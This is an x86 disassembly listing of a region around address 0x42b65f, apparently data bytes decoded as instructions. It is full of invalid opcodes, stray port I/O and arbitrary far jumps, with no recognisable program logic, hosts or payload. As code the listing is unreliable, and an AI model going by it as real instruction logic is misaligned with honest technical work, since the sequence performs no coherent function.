  42b65f:	and    bl,dl
  42b661:	sbb    ebx,ecx
  42b663:	mov    ds:0xcbe77da9,al
  42b668:	push   cs
  42b669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b66a:	rcr    ebp,0xcc
  42b66d:	or     al,0x2
  42b66f:	je     0x42b667
  42b671:	push   ebp
  42b672:	imul   esp,DWORD PTR [ecx-0x1a],0xee9299
  42b679:	xor    BYTE PTR [esi+ecx*8],0xbc
  42b67d:	dec    edi
  42b67e:	adc    ebx,DWORD PTR [edx-0x26]
  42b681:	sti    
  42b682:	dec    eax
  42b683:	and    ebx,DWORD PTR [ecx]
  42b685:	xchg   esp,eax
  42b687:	push   edx
  42b688:	mov    al,BYTE PTR [ecx*2-0x7b88b883]
  42b68f:	dec    edi
  42b690:	inc    ebx
  42b691:	push   esp
  42b692:	xor    ebx,DWORD PTR [edi-0x7f]
  42b695:	pop    eax
  42b696:	gs mov ebp,0xad1eb6b
  42b69c:	int    0xad
  42b69e:	mov    ebx,DWORD PTR [eax+ecx*8]
  42b6a1:	fiadd  WORD PTR [ebx+0x114fb703]
  42b6a7:	(bad)  
  42b6a8:	jmp    0x42b6ba
  42b6aa:	cmp    BYTE PTR ss:[ebx+0x6d],ah
  42b6ae:	repnz outs dx,DWORD PTR ds:[esi]
  42b6b0:	imul   ecx,DWORD PTR [edx+0x585cd068],0x537f73f2
  42b6ba:	ror    DWORD PTR [edi-0x2ba759d7],1
  42b6c0:	push   edi
  42b6c1:	ja     0x42b726
  42b6c3:	daa    
  42b6c4:	test   al,0x4c
  42b6c6:	mov    ah,0x1f
  42b6c8:	jle    0x42b6a6
  42b6ca:	mov    esi,0x7911b13
  42b6cf:	push   edx
  42b6d0:	pop    edi
  42b6d1:	xor    ebx,eax
  42b6d3:	or     eax,0x8935e65f
  42b6d8:	adc    al,0xdb
  42b6da:	neg    DWORD PTR [edx]
  42b6dc:	inc    eax
  42b6dd:	push   ebx
  42b6de:	xchg   esp,eax
  42b6df:	mov    al,ds:0x3a1e3981
  42b6e4:	out    dx,eax
  42b6e5:	jno    0x42b6d9
  42b6e7:	dec    ebp
  42b6e8:	mov    al,ds:0x24dffcb1
  42b6ed:	add    BYTE PTR [ebp-0x29],al
  42b6f0:	stos   BYTE PTR es:[edi],al
  42b6f1:	xchg   edx,eax
  42b6f2:	out    dx,eax
  42b6f3:	mov    ds:0xa03350a,al
  42b6f8:	pop    edi
  42b6f9:	or     eax,0x633ae683
  42b6fe:	fsubr  DWORD PTR ds:0xcc5a50d5
  42b704:	rcr    BYTE PTR [edi+eiz*8+0x4f],1
  42b708:	push   ebx
  42b709:	sbb    DWORD PTR [ebx+0x62],ebp
  42b70c:	not    DWORD PTR [ecx+0x73b7]
	...
  42b772:	add    BYTE PTR [eax],al
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	fwait
  42b781:	out    0x12,al
  42b783:	out    0xc8,eax
  42b785:	rol    BYTE PTR [ecx],1
  42b787:	add    BYTE PTR [ecx+eax*1],al
  42b78a:	add    BYTE PTR [eax],al
  42b78c:	jb     0x42b776
  42b78e:	cli    
  42b78f:	add    al,0xef
  42b791:	fld    DWORD PTR [eax-0x5ee0ba54]
  42b797:	rcl    BYTE PTR [ecx+0x23],0x4b
  42b79b:	lock shl DWORD PTR [ebp-0x3091b88c],cl
  42b7a2:	xchg   ecx,eax
  42b7a3:	inc    edx
  42b7a4:	mul    BYTE PTR [edx-0x22531909]
  42b7aa:	in     al,dx
  42b7ab:	pop    ss
  42b7ac:	jbe    0x42b760
  42b7ae:	popa   
  42b7af:	shl    BYTE PTR [eax-0x5c70eab4],0x46
  42b7b6:	shl    esi,1
  42b7b8:	aad    0x7d
  42b7ba:	sahf   
  42b7bb:	into   
  42b7bc:	js     0x42b7b5
  42b7be:	add    al,0x4e
  42b7c0:	jl     0x42b75a
  42b7c2:	call   0x1789:0x28ac4d9b
  42b7c9:	in     al,0xce
  42b7cb:	stc    
  42b7cc:	lods   al,BYTE PTR ds:[esi]
  42b7cd:	push   ebx
  42b7ce:	pop    ss
  42b7cf:	inc    ebx
  42b7d0:	dec    ebp
  42b7d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b7d2:	fsub   QWORD PTR [edx+0x49201840]
  42b7d8:	lock xchg esi,eax
  42b7da:	imul   edi,DWORD PTR [edi-0x6],0xffffffa2
  42b7de:	xchg   edi,eax
  42b7df:	mov    eax,ds:0x85f4556e
  42b7e4:	mov    bl,0x98
  42b7e6:	mov    al,ds:0xcab5b654
  42b7eb:	cmc    
  42b7ec:	iret   
  42b7ed:	call   0x1d7a:0x9bb3a88d
  42b7f4:	inc    esi
  42b7f5:	fmul   st(1),st
  42b7f7:	rol    BYTE PTR [edx+ebp*2],0x1f
  42b7fb:	inc    si
  42b7fd:	and    dh,BYTE PTR [esi+0x5e]
  42b800:	(bad)
  42b803:	xor    al,0xa8
  42b805:	mov    bl,0x98
  42b807:	out    0xb3,al
  42b809:	adc    DWORD PTR [edx-0x4e],edi
  42b80c:	jle    0x42b7b4
  42b80e:	hlt    
  42b80f:	(bad)  
  42b810:	retf   0x5410
  42b813:	cwde   
  42b814:	dec    edx
  42b815:	js     0x42b7e3
  42b817:	ret    0x77a6
  42b81a:	jmp    0x42b838
  42b81c:	cmp    eax,0xffd53e79
  42b821:	and    BYTE PTR [ebp+0x69a2127a],dh
  42b827:	cmp    al,0x9f
  42b829:	test   al,0xb5
  42b82b:	ds pop ebp
  42b82d:	mov    BYTE PTR [edx],ah
  42b82f:	xor    eax,DWORD PTR [edx-0x17]
  42b832:	fiadd  WORD PTR [esi]
  42b834:	and    esp,DWORD PTR [edi]
  42b836:	ja     0x42b885
  42b838:	test   eax,0x5c9196eb
  42b83d:	jnp    0x42b81f
  42b83f:	loope  0x42b85b
  42b841:	mov    bh,0x43
  42b844:	push   edi
  42b845:	out    dx,al
  42b846:	sub    al,0xaf
  42b848:	mov    WORD PTR [ebx-0x5a49b7e6],es
  42b84e:	ret    
  42b84f:	jl     0x42b869
  42b851:	shl    DWORD PTR [edi],1
  42b853:	(bad)  
  42b854:	lock out dx,eax
  42b856:	fst    DWORD PTR [esi-0x5c314ac5]
  42b85c:	mov    ds:0x17bedab8,eax
  42b861:	cmp    edi,DWORD PTR [ebx]
  42b863:	cmp    bl,BYTE PTR [ebx]
  42b865:	jl     0x42b89e
  42b867:	sahf   
  42b868:	inc    ebx
  42b869:	out    dx,al
  42b86a:	mov    ch,0xf7
  42b86c:	outs   dx,DWORD PTR ds:[esi]
  42b86d:	lds    ebp,FWORD PTR [eax]
  42b86f:	inc    esi
  42b870:	in     al,dx
  42b871:	xor    ecx,esi
  42b873:	xchg   ebp,eax
  42b874:	cmc    
  42b875:	and    ecx,eax
  42b877:	rcl    BYTE PTR [ebx-0x7d],1
  42b87a:	xor    al,0x7b
  42b87c:	outs   dx,BYTE PTR ds:[esi]
  42b87d:	aad    0x5e
  42b87f:	cmp    al,BYTE PTR [esi-0x3b]
  42b882:	repnz imul ebp,DWORD PTR [ebx],0xe
  42b886:	in     al,0xe1
  42b888:	add    ah,ah
  42b88a:	jg     0x42b8a9
  42b88c:	cdq    
  42b88d:	shl    DWORD PTR [eax+0xd2],1
	...
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     esp,ebx
  42b901:	inc    eax
  42b902:	mov    esp,0x1d1cc74
  42b907:	add    BYTE PTR [ecx+eax*1],al
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	or     BYTE PTR [edx-0x7d],ah
  42b90f:	int    0x2d
  42b911:	popa   
  42b912:	push   cs
  42b913:	ins    BYTE PTR es:[edi],dx
  42b914:	mov    ?,WORD PTR [ebx+0x3cbacaa6]
  42b91a:	push   esp
  42b91b:	icebp  
  42b91c:	es pop ds
  42b91e:	mov    dl,0x48
  42b920:	add    DWORD PTR [eax-0x1a905d43],ebp
  42b926:	jb     0x42b947
  42b928:	add    DWORD PTR [ecx+0x7b8e5858],ebp
  42b92e:	push   cs
  42b92f:	loop   0x42b917
  42b931:	rol    DWORD PTR [ecx-0x55361d68],cl
  42b937:	repnz enter 0xa835,0xe3
  42b93c:	lock cmp DWORD PTR [ebp+0x353df11d],ebp
  42b943:	out    0x88,al
  42b945:	popf   
  42b946:	pop    ss
  42b947:	mov    ebp,0x63280d96
  42b94c:	dec    ecx
  42b94d:	sar    BYTE PTR [eax+ebp*8],cl
  42b950:	lahf   
  42b951:	dec    esi
  42b952:	pop    ebx
  42b953:	test   al,0xf6
  42b955:	or     eax,0xa4e7d69a
  42b95a:	scas   al,BYTE PTR es:[edi]
  42b95b:	lods   al,BYTE PTR ds:[esi]
  42b95c:	mov    ?,WORD PTR ds:0x74a7c60b
  42b962:	mov    esi,0xecf15da5
  42b967:	mov    edx,0x8cfd4803
  42b96c:	fwait
  42b96d:	dec    eax
  42b96e:	add    al,0x79
  42b970:	jecxz  0x42b91f
  42b972:	mov    edx,0xe595f7fa
  42b977:	cli    
  42b978:	lods   eax,DWORD PTR ds:[esi]
  42b979:	dec    esp
  42b97a:	push   ecx
  42b97b:	fsubr  DWORD PTR [ebp+0x8]
  42b97e:	xchg   esi,eax
  42b97f:	push   es
  42b980:	mov    cl,0xff
  42b982:	arpl   WORD PTR [ebx-0x7fbc8c66],cx
  42b988:	cwde   
  42b989:	mov    ds:0x2cff29fa,al
  42b98e:	(bad)  
  42b98f:	in     al,0xef
  42b991:	aas    
  42b992:	cld    
  42b993:	inc    esp
  42b994:	jne    0x42b939
  42b996:	cmp    esp,DWORD PTR [ebx]
  42b998:	pusha  
  42b999:	lock xor BYTE PTR [eax-0x2f6aaa5a],ch
  42b9a0:	bound  edx,QWORD PTR [eax-0x13]
  42b9a3:	imul   ebp,DWORD PTR [ebx+0xe],0xf00f0e02
  42b9aa:	call   0xd591:0x4ecaf0ea
  42b9b1:	mov    cl,BYTE PTR [edx-0x5c]
  42b9b4:	dec    esi
  42b9b5:	jg     0x42b975
  42b9b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b9b8:	xchg   al,bl
  42b9ba:	push   edi
  42b9bb:	repnz nop
  42b9bd:	lods   al,BYTE PTR ds:[esi]
  42b9be:	jg     0x42b9e4
  42b9c0:	push   esi
  42b9c1:	aad    0x7d
  42b9c3:	adc    DWORD PTR [ebx+eax*4-0x52],eax
  42b9c7:	mov    ebp,0x9d0e7732
  42b9cc:	xor    bh,dl
  42b9ce:	cdq    
  42b9cf:	sub    esp,eax
  42b9d1:	xor    esi,DWORD PTR [ebp+0x33]
  42b9d4:	ror    DWORD PTR [edx+0x208a3d39],cl
  42b9da:	dec    edi
  42b9db:	test   BYTE PTR [ebx-0x71],ch
  42b9de:	gs mov dl,0x63
  42b9e1:	cli    
  42b9e2:	add    edi,DWORD PTR [edi+edi*4]
  42b9e5:	pop    edx
  42b9e6:	mov    esp,0x4107f694
  42b9eb:	push   edx
  42b9ec:	fld    TBYTE PTR ds:0x8339524a
  42b9f2:	shl    BYTE PTR [ecx+0x4a5015e3],cl
  42b9f8:	push   ecx
  42b9f9:	and    cl,BYTE PTR [eax]
  42b9fb:	daa    
  42b9fc:	and    al,BYTE PTR [ebp+0x8570343]
  42ba02:	mov    bh,0x21
  42ba04:	outs   dx,DWORD PTR ds:[esi]
  42ba05:	jmp    0x42ba68
  42ba07:	(bad)  
  42ba08:	ror    BYTE PTR [edi-0x21],0xc2
  42ba0c:	(bad)  [edi+ecx*4+0x3b]
	...
  42ba74:	mov    eax,DWORD PTR [edi]
  42ba76:	mov    al,0xe2
  42ba78:	mov    esp,0x6a6fdbf7
  42ba7d:	pop    ebx
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     eax,edx
  42ba81:	in     al,0x3c
  42ba83:	add    dl,al
  42ba85:	rol    BYTE PTR [ecx],cl
  42ba87:	add    BYTE PTR [ecx+eax*1],al
  42ba8a:	add    BYTE PTR [eax],al
  42ba8c:	ret    0xbab2
  42ba8f:	dec    ebx
  42ba90:	enter  0x2f9d,0x47
  42ba94:	enter  0x6152,0xc1
  42ba98:	loope  0x42bafd
  42ba9a:	mov    bh,0x8c
  42ba9c:	sbb    al,BYTE PTR [esi]
  42ba9e:	jmp    0xf04e:0x325fe720
  42baa5:	lods   eax,DWORD PTR ds:[esi]
  42baa6:	loopne 0x42ba3c
  42baa8:	jno    0x42bb21
  42baaa:	and    DWORD PTR [edx-0x6a3468c1],edi
  42bab0:	(bad)  
  42bab1:	hlt    
  42bab2:	retf   
  42bab3:	ss push ds
  42bab5:	loopne 0x42bac4
  42bab7:	jl     0x42ba75
  42bab9:	aaa    
  42baba:	add    DWORD PTR [ebp+0x37],ebx
  42babd:	xlat   BYTE PTR ds:[ebx]
  42babe:	(bad)  
  42babf:	xor    bl,BYTE PTR [ecx]
  42bac1:	mov    bl,BYTE PTR [edx]
  42bac3:	retf   
  42bac4:	cdq    
  42bac5:	fbld   TBYTE PTR [edx]
  42bac7:	xchg   esi,eax
  42bac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bac9:	jbe    0x42bb41
  42bacb:	jo     0x42ba5a
  42bacd:	(bad)  
  42bace:	stos   DWORD PTR es:[edi],eax
  42bacf:	ret    0x349
  42bad2:	inc    ecx
  42bad3:	leave  
  42bad4:	mov    WORD PTR [edi+0x1bc46db8],?
  42bada:	lea    ebp,[ecx-0x53]
  42badd:	and    al,0xbd
  42badf:	imul   ecx,ecx,0x38
  42bae2:	and    eax,0x58e64320
  42bae7:	pop    ebp
  42bae8:	(bad)  
  42bae9:	push   edx
  42baea:	mov    cl,0x5
  42baec:	ds push ds
  42baee:	imul   eax,DWORD PTR ds:0xb519957d,0x6d
  42baf5:	mov    al,0x4c
  42baf7:	pop    es
  42baf8:	pop    es
  42baf9:	fisubr DWORD PTR [ebp-0x247877e8]
  42baff:	(bad)
  42bb02:	loopne 0x42baa1
  42bb04:	sets   BYTE PTR [ecx]
  42bb07:	or     bl,BYTE PTR [esi-0xe]
  42bb0a:	mov    ecx,0x4116d484
  42bb0f:	push   esp
  42bb10:	fdivp  st(0),st
  42bb12:	repnz or ebx,DWORD PTR [eax-0x332b85d0]
  42bb19:	out    0x3e,eax
  42bb1b:	and    DWORD PTR [edi+0x20dc7682],ebx
  42bb21:	inc    ecx
  42bb22:	and    BYTE PTR [esi],0x76
  42bb25:	dec    ebp
  42bb26:	aam    0xf
  42bb28:	pusha  
  42bb29:	sub    al,0x99
  42bb2b:	inc    esi
  42bb2c:	dec    ebp
  42bb2d:	fwait
  42bb2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb2f:	in     eax,0x4
  42bb31:	pop    ebx
  42bb32:	aaa    
  42bb33:	add    edx,DWORD PTR [edx+0x424b918]
  42bb39:	test   BYTE PTR [eax-0x62d5cc9e],ah
  42bb3f:	or     ah,al
  42bb41:	mov    ebp,0x95b0fde8
  42bb46:	dec    ebx
  42bb47:	add    cl,BYTE PTR [ebx+esi*1+0x639cef39]
  42bb4e:	mov    BYTE PTR [ebx-0x181a7c81],0xd7
  42bb55:	jge    0x42bb00
  42bb57:	int3   
  42bb58:	shr    al,cl
  42bb5a:	and    ah,BYTE PTR [eax]
  42bb5c:	or     DWORD PTR [ebx-0x2bb74526],eax
  42bb62:	in     eax,0x13
  42bb64:	dec    eax
  42bb65:	repz dec esp
  42bb67:	push   esp
  42bb68:	inc    esi
  42bb69:	mov    ds:0xdf88ae60,al
  42bb6e:	push   0xffffffef
  42bb70:	scas   al,BYTE PTR es:[edi]
  42bb71:	add    BYTE PTR [edx-0x6d],0x50
  42bb75:	popf   
  42bb76:	push   eax
  42bb77:	fld    QWORD PTR [edi+edi*2]
  42bb7a:	(bad)  
  42bb7b:	cmp    al,0x75
  42bb7d:	xchg   DWORD PTR [ecx-0x65492cf5],edi
  42bb83:	sub    ch,BYTE PTR [ebp-0x7ef0d849]
  42bb89:	enter  0xcdc4,0x3c
  42bb8d:	xor    al,dh
  42bb8f:	pop    eax
	...
  42bbf4:	xor    al,0x28
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	das    
  42bc01:	retf   0x27f1
  42bc04:	aam    0xd3
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    al,0x1
  42bc0a:	add    BYTE PTR [eax],al
  42bc0c:	pusha  
  42bc0d:	out    dx,al
  42bc0e:	sahf   
  42bc0f:	xchg   esp,eax
  42bc10:	xor    al,0x34
  42bc12:	or     eax,0x2252f1d
  42bc17:	push   cs
  42bc18:	sbb    DWORD PTR [edx+0x5d065f16],esi
  42bc1e:	lahf   
  42bc1f:	jecxz  0x42bbe2
  42bc21:	push   ds
  42bc22:	(bad)  
  42bc23:	cmc    
  42bc24:	sbb    al,0xc6
  42bc26:	sbb    DWORD PTR [ebp+0x6e8e6554],edx
  42bc2c:	stos   BYTE PTR es:[edi],al
  42bc2d:	into   
  42bc2e:	mov    esi,0x9b8405e8
  42bc33:	push   cs
  42bc34:	mov    ebx,0xf40a4faa
  42bc39:	(bad)  
  42bc3a:	ja     0x42bc00
  42bc3c:	and    dl,BYTE PTR [ebx+0x26]
  42bc3f:	xchg   edx,eax
  42bc40:	hlt    
  42bc41:	lock push edi
  42bc43:	ficom  DWORD PTR [ecx-0x1270ca38]
  42bc49:	popa   
  42bc4a:	and    BYTE PTR [eax],bh
  42bc4c:	and    DWORD PTR [ecx],eax
  42bc4e:	rcr    BYTE PTR [ebp+edx*2+0x60],0x50
  42bc53:	fiadd  WORD PTR [esi-0x20]
  42bc56:	xchg   esp,eax
  42bc57:	cwde   
  42bc58:	xchg   ecx,eax
  42bc59:	shr    BYTE PTR [ebx+0x7f3c0089],0xe9
  42bc60:	arpl   cx,si
  42bc62:	sbb    BYTE PTR [ebp+0x1cfbb76a],bl
  42bc68:	mov    bl,0xa5
  42bc6a:	int3   
  42bc6b:	cdq    
  42bc6c:	push   0x2a90663e
  42bc71:	xor    bh,BYTE PTR [eax-0x1606210a]
  42bc77:	adc    eax,0x5f32ae8
  42bc7c:	dec    eax
  42bc7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bc7e:	dec    eax
  42bc7f:	loope  0x42bc32
  42bc81:	pop    eax
  42bc82:	jl     0x42bc56
  42bc84:	ficom  DWORD PTR [edi]
  42bc86:	jp     0x42bd05
  42bc88:	pop    ebp
  42bc89:	es test al,0xac
  42bc8c:	aas    
  42bc8d:	bound  ebp,QWORD PTR [ecx-0x16]
  42bc90:	lahf   
  42bc91:	bound  esp,QWORD PTR [edx+0x7f5101c6]
  42bc97:	(bad)  
  42bc98:	retf   
  42bc99:	cli    
  42bc9a:	xor    cl,BYTE PTR [esi+0x48]
  42bc9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc9e:	ficomp WORD PTR [esp+eax*1]
  42bca1:	add    al,0xa2
  42bca3:	fdivrp st(2),st
  42bca5:	sahf   
  42bca6:	inc    edx
  42bca7:	mov    ebp,0x68d9629d
  42bcac:	mov    WORD PTR [edx+0x78bca015],gs
  42bcb2:	mov    ch,0x3d
  42bcb4:	sub    eax,0x61f48c26
  42bcb9:	add    eax,0x1bf6ebe
  42bcbe:	cmovo  esi,DWORD PTR [ebp+0x12]
  42bcc2:	xchg   edi,eax
  42bcc3:	leave  
  42bcc4:	mov    ecx,0x3270e1f8
  42bcc9:	xchg   DWORD PTR [esi],esi
  42bccb:	inc    eax
  42bccc:	ins    DWORD PTR es:[edi],dx
  42bccd:	inc    ebx
  42bcce:	ins    DWORD PTR es:[edi],dx
  42bccf:	jmp    0x8d78af66
  42bcd4:	mov    ds:0x1cdf9c0b,al
  42bcd9:	call   0x1f83:0x3d5e3072
  42bce0:	xchg   dl,ah
  42bce2:	adc    BYTE PTR [ebx],ah
  42bce4:	dec    ecx
  42bce5:	jmp    edx
  42bce7:	inc    ebx
  42bce8:	cmp    DWORD PTR [eax],eax
  42bcea:	fcomp  DWORD PTR [edx-0x11355b81]
  42bcf0:	push   ds
  42bcf1:	inc    eax
  42bcf2:	mov    esi,0x773580c3
  42bcf7:	in     eax,dx
  42bcf8:	mov    esp,eax
  42bcfa:	mov    ah,0xc
  42bcfc:	test   DWORD PTR [ecx+ebp*4+0x5760dd87],ebp
  42bd03:	cmp    DWORD PTR [edi],ecx
  42bd05:	xchg   ebx,eax
  42bd06:	mov    DWORD PTR [edi],0x57d1b703
  42bd0c:	cli    
  42bd0d:	push   0x1c3e
	...
  42bd72:	add    BYTE PTR [eax],al
  42bd74:	mov    al,0xb6
  42bd76:	pushf  
  42bd77:	adc    al,0x9e
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd66
  42bd81:	cmp    bh,BYTE PTR [ebx+esi*8+0x1d4d8]
  42bd88:	add    al,0x1
  42bd8a:	add    BYTE PTR [eax],al
  42bd8c:	mov    bh,0x97
  42bd8e:	jns    0x42bd9d
  42bd90:	sub    al,0x27
  42bd92:	pop    ds
  42bd93:	cs jne 0x42bdb5
  42bd96:	data16 jo 0x42bd5f
  42bd99:	in     eax,0xe7
  42bd9b:	inc    ebp
  42bd9c:	pop    ss
  42bd9d:	xchg   DWORD PTR [ecx-0x57],esp
  42bda0:	jno    0x42bdd8
  42bda2:	scas   eax,DWORD PTR es:[edi]
  42bda3:	mov    ebp,0xb5fcbaf5
  42bda8:	mov    ch,0x41
  42bdaa:	stos   BYTE PTR es:[edi],al
  42bdab:	push   edi
  42bdac:	dec    edx
  42bdad:	sti    
  42bdae:	dec    edx
  42bdaf:	lea    ecx,ds:0x3004e831
  42bdb5:	jl     0x42bdc6
  42bdb7:	mov    ch,0x52
  42bdb9:	out    dx,eax
  42bdba:	(bad)  [eax-0x16c90d87]
  42bdc0:	and    BYTE PTR [edx+0x2a659bde],0x21
  42bdc7:	xor    cl,BYTE PTR [ecx+esi*2-0x333272cf]
  42bdce:	push   edx
  42bdcf:	aaa    
  42bdd0:	rcl    esi,cl
  42bdd2:	test   BYTE PTR [edi+0x8],dl
  42bdd5:	add    cl,BYTE PTR [ebp+0x4b5293a2]
  42bddb:	bswap  edi
  42bddd:	je     0x42bd7e
  42bddf:	xchg   edx,eax
  42bde0:	cld    
  42bde1:	jl     0x42bdbf
  42bde3:	in     al,0xfb
  42bde5:	push   ds
  42bde6:	jo     0x88687194
  42bdec:	xchg   edi,eax
  42bded:	xchg   ecx,eax
  42bdee:	or     ecx,eax
  42bdf0:	push   ss
  42bdf1:	add    eax,0x4749981b
  42bdf6:	(bad)  
  42bdf7:	popf   
  42bdf8:	test   al,0xf2
  42bdfa:	add    al,0x9d
  42bdfc:	cdq    
  42bdfd:	or     ah,bh
  42bdff:	ins    DWORD PTR es:[edi],dx
  42be00:	aaa    
  42be01:	shufps xmm2,XMMWORD PTR [ebx+0x46edd6d4],0xd6
  42be09:	je     0x42bdb1
  42be0b:	repnz sbb esi,DWORD PTR [ebx+0x5a]
  42be0f:	mov    al,ds:0xb7a19fde
  42be14:	jns    0x42bdc5
  42be16:	sar    esp,0x1c
  42be19:	pusha  
  42be1a:	int    0x6c
  42be1c:	push   0x876e9d55
  42be21:	mov    dh,0xbb
  42be23:	sub    dl,BYTE PTR [edx]
  42be25:	mov    DWORD PTR [edi],ecx
  42be27:	or     eax,0x54589d6c
  42be2c:	jno    0x42be2c
  42be2e:	jle    0x42bde3
  42be30:	mov    dl,BYTE PTR [edx+0x8]
  42be33:	fnstenv [ebx+0x74b0e412]
  42be39:	lods   al,BYTE PTR ds:[esi]
  42be3a:	or     esi,esp
  42be3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be3d:	and    DWORD PTR [esi],ebx
  42be3f:	xchg   edi,eax
  42be40:	xchg   ecx,eax
  42be41:	mov    esp,0x600c3d76
  42be46:	sbb    al,0xe6
  42be48:	int    0x53
  42be4a:	mov    edx,0x3bfbb4e1
  42be4f:	outs   dx,DWORD PTR ds:[esi]
  42be50:	mov    ch,0x4d
  42be52:	mov    ah,0x70
  42be54:	retf   0xa34a
  42be57:	aad    0x86
  42be59:	sbb    BYTE PTR [eax+0x5310c8c5],ch
  42be5f:	mov    edi,0x25e11257
  42be64:	sbb    al,0x89
  42be66:	stos   BYTE PTR es:[edi],al
  42be67:	es mov ebx,0x7e100676
  42be6d:	sub    eax,esp
  42be6f:	das    
  42be70:	push   ebp
  42be71:	pop    esp
  42be72:	(bad)  
  42be73:	mov    ds:0xe8bb062,eax
  42be78:	mov    ds:0xcb5b0bca,al
  42be7d:	dec    ebp
  42be7e:	add    al,BYTE PTR [eax+0x620105df]
  42be84:	pop    ss
  42be85:	mov    cl,0x9
  42be87:	mov    cl,0xd3
  42be89:	mov    esp,DWORD PTR [esi-0x451dd901]
  42be8f:	push   ebx
	...
  42bef4:	xchg   edi,eax
  42bef5:	and    BYTE PTR [edi-0x26],al
  42bef8:	idiv   edi
  42befa:	lahf   
  42befb:	ins    DWORD PTR es:[edi],dx
  42befc:	mov    ds:0x307bd7c8,eax
  42bf01:	lock pop edi
  42bf03:	mov    bl,ah
  42bf05:	aad    0x1
  42bf07:	add    BYTE PTR [ecx+eax*1],al
  42bf0a:	add    BYTE PTR [eax],al
  42bf0c:	push   ebx
  42bf0d:	cmp    al,BYTE PTR [eax-0x6bfd4b0a]
  42bf13:	push   edi
  42bf14:	inc    edi
  42bf15:	adc    eax,0xc7059805
  42bf1a:	pop    edx
  42bf1b:	cmp    DWORD PTR [ecx+0x6b],edi
  42bf1e:	pop    ds
  42bf1f:	(bad)  
  42bf20:	out    dx,eax
  42bf21:	xlat   BYTE PTR ds:[ebx]
  42bf22:	test   bh,bl
  42bf24:	adc    bl,BYTE PTR [esi]
  42bf26:	lods   eax,DWORD PTR ds:[esi]
  42bf27:	rcl    BYTE PTR [ecx+0x61a401f9],0x7a
  42bf2e:	pop    edx
  42bf2f:	fild   DWORD PTR [edi+edi*2-0x3c5d0823]
  42bf36:	out    0xbc,al
  42bf38:	pop    esi
  42bf39:	loope  0x42bf8d
  42bf3b:	fadd   DWORD PTR [edx-0x2a]
  42bf3e:	outs   dx,DWORD PTR ds:[esi]
  42bf3f:	stc    
  42bf40:	jp     0x42bf3c
  42bf42:	mov    eax,DWORD PTR [ecx+ebx*8-0x1cf437a0]
  42bf49:	test   al,0x48
  42bf4b:	stos   BYTE PTR es:[edi],al
  42bf4c:	jmp    0xa849:0x291da840
  42bf53:	jmp    0x42bf4c
  42bf55:	add    esp,esi
  42bf57:	(bad)  
  42bf58:	mov    al,0xb6
  42bf5a:	pop    esp
  42bf5b:	jmp    0xe5d08c40
  42bf60:	out    0xd8,al
  42bf62:	in     al,0x2f
  42bf64:	ins    DWORD PTR es:[edi],dx
  42bf65:	sbb    esp,DWORD PTR [edx-0x74eb1c33]
  42bf6b:	into   
  42bf6c:	cmp    BYTE PTR [ebx-0x1e],dh
  42bf6f:	dec    ebp
  42bf70:	dec    ebx
  42bf71:	retfw  0x7925
  42bf75:	inc    esi
  42bf76:	xchg   edi,eax
  42bf77:	(bad)  
  42bf79:	or     al,0x11
  42bf7b:	push   0x6b
  42bf7d:	in     al,0x86
  42bf7f:	mov    cl,0x80
  42bf81:	int    0xd2
  42bf83:	sub    DWORD PTR [ebp-0x3],edi
  42bf86:	xchg   ecx,eax
  42bf87:	cdq    
  42bf88:	cmp    eax,0x619966fe
  42bf8d:	and    DWORD PTR [ecx-0x4ddc4544],esi
  42bf93:	popa   
  42bf94:	mov    dl,0x9b
  42bf96:	and    dh,cl
  42bf98:	test   ecx,esi
  42bf9a:	test   dh,dh
  42bf9c:	add    al,0xfa
  42bf9e:	jge    0x42bf37
  42bfa0:	sar    cl,0x43
  42bfa3:	or     ch,BYTE PTR [ebx+0x3d]
  42bfa6:	mov    ah,0x8
  42bfa8:	jbe    0x42bfad
  42bfaa:	div    BYTE PTR [edx]
  42bfac:	sbb    al,0xa2
  42bfae:	jmp    0xce04:0x2dad46da
  42bfb5:	inc    ecx
  42bfb6:	addr16 loopne 0x42c001
  42bfb9:	ins    BYTE PTR es:[edi],dx
  42bfba:	(bad)  
  42bfbb:	adc    DWORD PTR [eax],edi
  42bfbd:	daa    
  42bfbe:	xchg   ebx,eax
  42bfbf:	mov    DWORD PTR [edi],ecx
  42bfc1:	aas    
  42bfc2:	out    dx,eax
  42bfc3:	xchg   al,dl
  42bfc5:	mov    BYTE PTR [esp+ebx*2-0x12647273],0xac
  42bfcd:	add    DWORD PTR [edi+0x4f58b4c8],edi
  42bfd3:	cmp    al,0x46
  42bfd5:	add    dh,ch
  42bfd7:	ror    DWORD PTR [edi-0x39],cl
  42bfda:	pop    eax
  42bfdb:	pop    ds
  42bfdc:	stc    
  42bfdd:	pop    esi
  42bfde:	arpl   WORD PTR [ebx-0x1b],cx
  42bfe1:	sub    edi,edx
  42bfe3:	imul   ecx,DWORD PTR [ecx+0x75affd7e],0x69
  42bfea:	clc    
  42bfeb:	dec    edx
  42bfec:	or     al,0x2e
  42bfee:	mov    bh,0xd2
  42bff0:	popf   
  42bff1:	rcl    edi,cl
  42bff3:	rol    DWORD PTR [ecx-0x23],1
  42bff6:	mov    ebx,0xd87faa07
  42bffb:	sbb    al,0x64
  42bffd:	fucom  st(0)
  42bfff:	push   ds
  42c000:	call   0x1483ddc4
